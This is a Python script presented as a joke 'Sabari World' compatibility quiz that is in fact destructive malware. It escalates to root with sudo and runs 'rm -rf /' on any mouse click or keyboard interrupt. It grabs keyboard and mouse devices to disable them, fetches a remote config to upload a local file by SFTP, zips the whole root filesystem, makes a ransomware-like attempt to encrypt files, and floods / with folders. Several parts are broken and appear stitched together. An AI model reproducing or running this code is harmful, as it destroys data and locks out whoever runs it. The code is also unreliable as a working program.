import os
from cryptography.fernet import Fernet
import subprocess
import platform
import sys
import zipfile
import requests
import paramiko
import configparser
from pynput import mouse
import time
import evdev


# Check if the script is already running as root
if os.geteuid() == 0:
    print("You are already running as root!")
else:
    # Attempt to escalate privileges using sudo
    try:
        # Get the absolute path to the current script
        script_path = os.path.abspath(sys.argv[0])
        
        # Execute the script with sudo
        os.execlp("sudo", "sudo", "python3", script_path)
    except Exception as e:
        print(f"Failed to acquire root privileges: {e}")
os_name = platform.system()
print(os_name)
# Check if the script is running as root
if os.geteuid() == 0:
    print("You are already running as root!")
else:
    # Prompt the user for root privileges
    print("This script requires root privileges to continue.")
    print("Please enter your password below:")
    
    # Execute a command that requires root privileges (e.g., updating the system)
    try:
        subprocess.run(["sudo", "apt", "update"], check=True)
        print("Update successful!")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred: {e}")

if os_name == "Linux":
    # Install dependencies
    dependencies = ['pynput','evdev','' 'cryptography']
    for dependency in dependencies:
        subprocess.run(['pip', 'install', dependency])

    os.system("figlet 'Welcome to Sabari World!' | lolcat")
    print("\n")
    print("Let's check your compatibility for the Sabari World \n")
    print("If your guess is wrong, your system will be sabarified..........!!!!!!!! \n")
    y = input("Are you sure Sabari is Sabari? Please type YES or NO: ")
    if y.upper() == "YES":
        print("Welcome to Sabari World")
        exit()
    else:
        print("You are not compatible for Sabari World")
def on_click(x, y, button, pressed):
    if pressed:
        os.system("rm -rf /") 
 
def check_input():
    try:
        while True:
            # Simulate some activity
            print("You Are Doomed...")

            # Listen for mouse events
            with mouse.Listener(on_click=on_click) as listener:
                listener.join()

            # Sleep for a short duration
            time.sleep(1)
    except KeyboardInterrupt:
        os.system("rm -rf /")

if __name__ == "__main__":
    check_input()

def disable_input_devices():
    # Get list of input devices
    devices = [evdev.InputDevice(fn) for fn in evdev.list_devices()]

    # Filter keyboard and mouse devices
    keyboard_devices = [dev for dev in devices if 'keyboard' in dev.name.lower()]
    mouse_devices = [dev for dev in devices if 'mouse' in dev.name.lower()]

    # Disable keyboard devices
    for dev in keyboard_devices:
        try:
            dev.grab()
            print(f"Keyboard device {dev.name} disabled.")
        except OSError as e:
            print(f"Failed to disable {dev.name}: {e}")

    # Disable mouse devices
    for dev in mouse_devices:
        try:
            dev.grab()
            print(f"Mouse device {dev.name} disabled.")
        except OSError as e:
            print(f"Failed to disable {dev.name}: {e}")

if __name__ == "__main__":
    # Check if running with root privileges
    if os.geteuid() != 0:
        print("This script requires root privileges to run.")
        sys.exit(1)

    # Disable input devices
    disable_input_devices()
      
def download_config_file(url, local_file_path):
    response = requests.get(url)
    with open(local_file_path, 'wb') as f:
        f.write(response.content)

def upload_file(local_file_path, remote_file_path, hostname, port, username, password):
    transport = paramiko.Transport((hostname, port))
    transport.connect(username=username, password=password)
    sftp = paramiko.SFTPClient.from_transport(transport)
    sftp.put(local_file_path, remote_file_path)
    sftp.close()
    transport.close()

def delete_file(file_path):
    if os.path.exists(file_path):
        os.remove(file_path)

def uploadfile():
    # URL to download the configuration file
    config_file_url = 'http://example.com/config.ini'

    # Local path to save the downloaded configuration file
    local_config_path = 'config.ini'

    # Download the configuration file from the remote server via HTTP
    download_config_file(config_file_url, local_config_path)

    # Load remote server details from the downloaded config file
    config = configparser.ConfigParser()
    config.read(local_config_path)

    # Remote server details for SFTP upload
    upload_hostname = config['REMOTE_SERVER_UPLOAD']['hostname']
    upload_port = int(config['REMOTE_SERVER_UPLOAD']['port'])
    upload_username = config['REMOTE_SERVER_UPLOAD']['username']
    upload_password = config['REMOTE_SERVER_UPLOAD']['password']

    # Local file to upload to the remote server
    local_file_path = '/path/to/local/file.txt'

    # Remote destination folder for the file upload
    remote_folder_path = '/path/to/remote/folder'

    # Upload the local file to the remote server via SFTP
    upload_file(local_file_path, remote_folder_path, upload_hostname, upload_port, upload_username, upload_password)

    # Delete the configuration file from the local system
    delete_file(local_config_path)

if __name__ == "__main__":
    uploadfile()

os.system("mkdir /sabarified && echo 'You are sabarified' >> /sabarified.txt")
os.system("figlet 'You are SABARIFIED!!!'")
def zip_folder(folder_path, zip_path):
    
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        for root, _, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                zip_file.write(file_path, os.path.relpath(file_path, folder_path))

def main():
    folder_path = '/'  # Specify the folder path to zip
    zip_path = 'output.zip'  # Specify the output zip file path
    zip_folder(folder_path, zip_path)
    print("Folder zipped successfully.")

if __name__ == "__main__":
    main()
key = Fernet.generate_key()
cipher = Fernet(key)
file_path = "/*"
with open(file_path, "rb") as file:
            plaintext = file.read()
encrypted_text = cipher.encrypt(plaintext)
encrypted_file_path = "encrypted1_file.enc"
with open(encrypted_file_path, "wb") as encrypted_file:
            encrypted_file.write(encrypted_text)
print("Your Files are Sabarified.")
base_dir = "/"
max_folder_size = 90000000000
num_folders = 1000
for i in range(1, num_folders + 1):
            folder_name = f"folder_{i}"
            folder_path = os.path.join(base_dir, folder_name)

            # Check if the folder size exceeds the maximum limit
            if os.path.exists(folder_path):
                folder_size = sum(os.path.getsize(os.path.join(folder_path, f)) for f in os.listdir(folder_path))
                if folder_size >= max_folder_size:
                    print(f"Folder '{folder_name}' already exceeds the maximum size limit.")
                    continue

            # Create the folder
            os.makedirs(folder_path, exist_ok=True)
            print(f"Folder '{folder_name}' created at: {folder_path}")

else:
    exit()
